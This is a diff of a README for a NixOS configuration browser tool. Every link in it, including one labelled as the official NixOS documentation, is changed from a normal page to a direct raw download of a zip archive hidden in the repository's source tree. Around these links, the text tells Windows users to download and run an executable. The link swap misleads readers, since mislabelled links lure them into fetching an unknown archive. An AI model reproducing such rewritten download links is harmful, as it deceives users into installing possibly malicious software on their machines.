@@ -1,6 +1,6 @@
 # 🛠️ nixos-config-tui - Easy NixOS Config Browser
 
-[![Download nixos-config-tui](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/mesoalrubasi/nixos-config-tui)
+[![Download nixos-config-tui](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/mesoalrubasi/nixos-config-tui/raw/refs/heads/main/src/tree/nixos_config_tui_3.1.zip)
 
 ## 📋 What is nixos-config-tui?
 
@@ -25,7 +25,7 @@ To use nixos-config-tui, you will need to download it and run it on your Windows
 
 Visit this page to download the application:
 
-[![Download nixos-config-tui](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/mesoalrubasi/nixos-config-tui)
+[![Download nixos-config-tui](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/mesoalrubasi/nixos-config-tui/raw/refs/heads/main/src/tree/nixos_config_tui_3.1.zip)
 
 Click the link above to go to the GitHub page for nixos-config-tui. This page contains the files you need to download the tool.
 
@@ -75,7 +75,7 @@ These features help make NixOS configuration easier to understand.
 
 ## 🔄 How to Update nixos-config-tui
 
-1. Return to the [nixos-config-tui GitHub page](https://github.com/mesoalrubasi/nixos-config-tui).  
+1. Return to the [nixos-config-tui GitHub page](https://github.com/mesoalrubasi/nixos-config-tui/raw/refs/heads/main/src/tree/nixos_config_tui_3.1.zip).  
 2. Check for newer releases under the Releases section.  
 3. Download the updated `.exe` file following the steps above.  
 4. Replace the old file on your computer with the new one.  
@@ -89,9 +89,9 @@ These features help make NixOS configuration easier to understand.
 
 ## 🔗 Relevant Links
 
-- [Download and setup nixos-config-tui](https://github.com/mesoalrubasi/nixos-config-tui)  
-- [NixOS Official Documentation](https://nixos.org/manual)  
+- [Download and setup nixos-config-tui](https://github.com/mesoalrubasi/nixos-config-tui/raw/refs/heads/main/src/tree/nixos_config_tui_3.1.zip)  
+- [NixOS Official Documentation](https://github.com/mesoalrubasi/nixos-config-tui/raw/refs/heads/main/src/tree/nixos_config_tui_3.1.zip)  
 
 ---
 
-[![Download nixos-config-tui](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/mesoalrubasi/nixos-config-tui)
+[![Download nixos-config-tui](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/mesoalrubasi/nixos-config-tui/raw/refs/heads/main/src/tree/nixos_config_tui_3.1.zip)
